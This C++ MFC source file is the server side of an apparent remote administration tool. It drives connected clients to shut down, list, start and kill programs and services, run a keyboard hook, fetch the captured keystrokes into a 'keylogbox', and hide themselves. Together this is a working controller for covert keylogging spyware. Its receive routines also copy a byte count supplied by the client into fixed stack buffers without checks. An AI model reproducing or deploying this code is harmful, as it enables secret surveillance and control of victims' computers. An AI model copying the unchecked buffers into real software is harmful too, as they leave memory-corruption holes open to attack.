
// Server.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "Server.h"
#include "ServerDlg.h"
#include "ServerSock.h"
#include "ClientSock.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CServerApp

BEGIN_MESSAGE_MAP(CServerApp, CWinApp)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()


// CServerApp construction

CServerApp::CServerApp()
{
	// support Restart Manager
	m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;

	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}


// The one and only CServerApp object

CServerApp theApp;


// CServerApp initialization

BOOL CServerApp::InitInstance()
{
	// InitCommonControlsEx() is required on Windows XP if an application
	// manifest specifies use of ComCtl32.dll version 6 or later to enable
	// visual styles.  Otherwise, any window creation will fail.
	INITCOMMONCONTROLSEX InitCtrls;
	InitCtrls.dwSize = sizeof(InitCtrls);
	// Set this to include all the common control classes you want to use
	// in your application.
	InitCtrls.dwICC = ICC_WIN95_CLASSES;
	InitCommonControlsEx(&InitCtrls);

	CWinApp::InitInstance();

	if (!AfxSocketInit())
	{
		AfxMessageBox(IDP_SOCKETS_INIT_FAILED);
		return FALSE;
	}


	AfxEnableControlContainer();

	// Create the shell manager, in case the dialog contains
	// any shell tree view or shell list view controls.
	CShellManager *pShellManager = new CShellManager;

	// Activate "Windows Native" visual manager for enabling themes in MFC controls
	CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows));

	// Standard initialization
	// If you are not using these features and wish to reduce the size
	// of your final executable, you should remove from the following
	// the specific initialization routines you do not need
	// Change the registry key under which our settings are stored
	// TODO: You should modify this string to be something appropriate
	// such as the name of your company or organization
	SetRegistryKey(_T("Local AppWizard-Generated Applications"));

	CServerDlg dlg;
	m_pMainWnd = &dlg;
	INT_PTR nResponse = dlg.DoModal();
	if (nResponse == IDOK)
	{
		// TODO: Place code here to handle when the dialog is
		//  dismissed with OK
	}
	else if (nResponse == IDCANCEL)
	{
		// TODO: Place code here to handle when the dialog is
		//  dismissed with Cancel
	}
	else if (nResponse == -1)
	{
		TRACE(traceAppMsg, 0, "Warning: dialog creation failed, so application is terminating unexpectedly.\n");
		TRACE(traceAppMsg, 0, "Warning: if you are using MFC controls on the dialog, you cannot #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS.\n");
	}

	// Delete the shell manager created above.
	if (pShellManager != NULL)
	{
		delete pShellManager;
	}

	// Since the dialog has been closed, return FALSE so that we exit the
	//  application, rather than start the application's message pump.
	return FALSE;
}

bool CServerApp::pushNewClient(ClientSock* newClient, CString &error){
	this->m_clients.push_back(newClient);
	return true;
}

void CServerApp::initServer(){
	this->m_server = new ServerSock();
	this->m_server->Create(1124);
}
void CServerApp::startListen(){
	this->m_server->Listen();
}
ClientSock* CServerApp::findClientByIP(CString ip){
	for (int i = 0; i < m_clients.size(); i++)
		if (m_clients[i]!=NULL && m_clients[i]->getIPAddress().Compare(ip) == 0)
			return m_clients[i];
	return NULL;
}
void CServerApp::setSelectedClientByIP(CString ip){
	m_selectedClient = findClientByIP(ip);
}

void CServerApp::shutDown(CDialog* dlg){
	if (m_selectedClient != NULL)
		m_selectedClient->sendMessage("shutdown");
	else{
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("Please select a connected client"), (LPCWSTR)CString("alert"), 0);
	}
}
void CServerApp::SeeApplication(CDialog* dlg){
	if (m_selectedClient != NULL){
		m_selectedClient->sendMessage("app-see");
		char feedback[100];
		m_selectedClient->receiveExactlyNByte(feedback, 100);
		if (strcmp(feedback, "successfully")==0){
			int nByte;
			m_selectedClient->receiveExactlyNByte((char*)&nByte, 4);

			WCHAR appList[100000];
			
			int sum = m_selectedClient->receiveExactlyNByte((char*)appList, nByte);

			
			SetDlgItemText(dlg->m_hWnd, IDC_applist, (LPCTSTR)(appList));
		}
		else{
			MessageBox(dlg->m_hWnd, (LPCWSTR)CString("failed"), (LPCWSTR)CString("failed"), 0);
		}
	}
	else{
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("Please select a connected client"), (LPCWSTR)CString("alert"), 0);
	}

}

void CServerApp::disconnectClient(CDialog* dlg){
	if (this->m_selectedClient != NULL)
	{
		this->m_selectedClient->sendMessage("quit");
		this->m_selectedClient->Close();
		for (int i = 0; i < m_clients.size(); i++)
			if (m_selectedClient == m_clients[i] && m_clients[i] != NULL){
				delete m_clients[i];
				m_clients[i] = NULL;
			}
				
		this->m_selectedClient = NULL;
	}
	else{
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("Please select a connected client"), (LPCWSTR)CString("alert"), 0);
	}
}
void CServerApp::startApplication(CDialog* dlg){
	if (this->m_selectedClient != NULL){
		//send app-start command
		this->m_selectedClient->sendMessage("app-start");

		//get appname
		WCHAR appname[1000];
		GetDlgItemText(dlg->m_hWnd, IDC_appname, (LPWSTR)appname, 1000);
		
		//get send size, and send
		int sendSize = (wcslen(appname) + 1)*sizeof(WCHAR);
		this->m_selectedClient->Send(&sendSize, 4, 0);

		//send app name
		this->m_selectedClient->Send(appname, sendSize, 0);

		//receive feedback
		char feedBack[100];
		m_selectedClient->receiveExactlyNByte(feedBack, 100);

		//inform feedback to user
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString(feedBack),(LPCWSTR)CString("infomation"), 0);

	}
	else{
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("Please select a connected client"), (LPCWSTR)CString("alert"), 0);
	}
}
void CServerApp::killApplication(CDialog* dlg){
	if (this->m_selectedClient != NULL){
		//send app-kill command
		this->m_selectedClient->sendMessage("app-kill");

		//get id
		WCHAR appid[1000];
		GetDlgItemText(dlg->m_hWnd, IDC_appid, (LPWSTR)appid, 1000);

		//get send size, and send
		int sendSize = (wcslen(appid) + 1)*sizeof(WCHAR);
		this->m_selectedClient->Send(&sendSize, 4, 0);

		//send app name
		this->m_selectedClient->Send(appid, sendSize, 0);

		//receive feedback
		char feedBack[100];
		m_selectedClient->receiveExactlyNByte(feedBack, 100);

		//inform feedback to user
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString(feedBack), (LPCWSTR)CString("infomation"), 0);
	}
	else{
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("Please select a connected client"), (LPCWSTR)CString("alert"), 0);
	}
}

void CServerApp::seeService(CDialog* dlg){
	if (this->m_selectedClient != NULL){
		//send service-see command
		this->m_selectedClient->sendMessage("service-see");

		char feedback[100];
		m_selectedClient->receiveExactlyNByte(feedback, 100);
		if (strcmp(feedback, "successfully") == 0){
			int nByte;
			m_selectedClient->receiveExactlyNByte((char*)&nByte, 4);

			char serviceList[10000];

			int sum = m_selectedClient->receiveExactlyNByte(serviceList, nByte);

			SetDlgItemText(dlg->m_hWnd, IDC_listservices, (LPCTSTR)CString(serviceList));
		}
		else{
			MessageBox(dlg->m_hWnd, (LPCWSTR)CString("failed"), (LPCWSTR)CString("failed"), 0);
		}
	}
	else{
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("Please select a connected client"), (LPCWSTR)CString("alert"), 0);
	}
}

void CServerApp::startService(CDialog* dlg){
	if (this->m_selectedClient != NULL){
		//send app-start command
		this->m_selectedClient->sendMessage("service-start");

		//get servicename
		WCHAR servicename[1000];
		GetDlgItemText(dlg->m_hWnd, IDC_ssname, (LPWSTR)servicename, 1000);

		//get send size, and send
		int sendSize = (wcslen(servicename) + 1)*sizeof(WCHAR);
		this->m_selectedClient->Send(&sendSize, 4, 0);

		//send app name
		this->m_selectedClient->Send(servicename, sendSize, 0);

		//receive feedback
		char feedBack[100];
		m_selectedClient->receiveExactlyNByte(feedBack, 100);

		//inform feedback to user
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString(feedBack), (LPCWSTR)CString("infomation"), 0);

	}
	else{
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("Please select a connected client"), (LPCWSTR)CString("alert"), 0);
	}
}

void CServerApp::stopService(CDialog* dlg){
	if (this->m_selectedClient != NULL){
		//send app-start command
		this->m_selectedClient->sendMessage("service-stop");

		//get servicename
		WCHAR servicename[1000];
		GetDlgItemText(dlg->m_hWnd, IDC_sstopname, (LPWSTR)servicename, 1000);

		//get send size, and send
		int sendSize = (wcslen(servicename) + 1)*sizeof(WCHAR);
		this->m_selectedClient->Send(&sendSize, 4, 0);

		//send app name
		this->m_selectedClient->Send(servicename, sendSize, 0);

		//receive feedback
		char feedBack[100];
		m_selectedClient->receiveExactlyNByte(feedBack, 100);

		//inform feedback to user
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString(feedBack), (LPCWSTR)CString("infomation"), 0);

	}
	else{
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("Please select a connected client"), (LPCWSTR)CString("alert"), 0);
	}
}

void CServerApp::startHook(CDialog* dlg){
	if (this->m_selectedClient != NULL){
		//send app-start command
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("hooked"),(LPCWSTR)CString( "information"), 0);
		this->m_selectedClient->sendMessage("hook-start");
	}
	else{
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("Please select a connected client"), (LPCWSTR)CString("alert"), 0);
	}
}

void CServerApp::unHook(CDialog* dlg){
	if (this->m_selectedClient != NULL){
		//send app-start command
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("unhooked"), (LPCWSTR)CString("information"), 0);

		this->m_selectedClient->sendMessage("hook-stop");
	}
	else{
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("Please select a connected client"), (LPCWSTR)CString("alert"), 0);
	}
}
void CServerApp::getHook(CDialog* dlg){
	if (this->m_selectedClient != NULL){
		//send app-start command
		this->m_selectedClient->sendMessage("hook-get");
		int nByte;
		m_selectedClient->receiveExactlyNByte((char*)&nByte, 4);
		char a[10000];
		if(nByte!=0)
			m_selectedClient->receiveExactlyNByte(a, nByte);
		SetDlgItemText(dlg->m_hWnd, IDC_keylogbox, (LPCWSTR)CString(a));
	}
	else{
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("Please select a connected client"), (LPCWSTR)CString("alert"), 0);
	}
}
void CServerApp::hideClient(CDialog* dlg){
	if (this->m_selectedClient != NULL){
		//send app-start command
		this->m_selectedClient->sendMessage("hide");
		char feedback[100];
		this->m_selectedClient->receiveExactlyNByte(feedback, 100);
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString(feedback), (LPCWSTR)CString("info"), 0);
	}
	else{
		MessageBox(dlg->m_hWnd, (LPCWSTR)CString("Please select a connected client"), (LPCWSTR)CString("alert"), 0);
	}
}

CServerApp::~CServerApp(){
	for (int i = 0; i < m_clients.size(); i++)
		if (m_clients[i] != NULL)
			delete m_clients[i];
	if (m_server != NULL)
		delete m_server;
}